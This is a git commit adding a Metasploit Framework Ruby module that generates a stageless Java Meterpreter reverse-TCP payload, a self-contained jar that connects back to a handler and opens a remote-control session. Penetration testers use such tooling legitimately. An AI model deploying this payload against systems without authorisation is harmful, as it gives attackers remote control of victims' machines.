b8c68151f62a77de4a15a7da6ae1ccc53c3fbb4a
OJ Reeves <oj@oj.cx>
2026-05-14 00:04:54 +1000

    Add stagless payloads for Java

---
+++ modules/payloads/singles/java/meterpreter_reverse_tcp.rb
@@ -0,0 +1,32 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+module MetasploitModule
+  CachedSize = :dynamic
+
+  include Msf::Payload::Single
+  include Msf::Payload::Java::ReverseTcp
+  include Msf::Payload::Java::MeterpreterLoader
+
+  def initialize(info = {})
+    super(
+      merge_info(
+        info,
+        'Name' => 'Java Meterpreter, Reverse TCP Stageless',
+        'Description' => 'Run a meterpreter server in Java. Reverse TCP. Self-contained jar.',
+        'Author' => ['mihi', 'egypt', 'OJ Reeves'],
+        'Platform' => 'java',
+        'Arch' => ARCH_JAVA,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'License' => MSF_LICENSE,
+        'Session' => Msf::Sessions::Meterpreter_Java_Java
+      )
+    )
+  end
+
+  def generate(opts = {})
+    stage_meterpreter(opts.merge(stageless: true))
+  end
+end
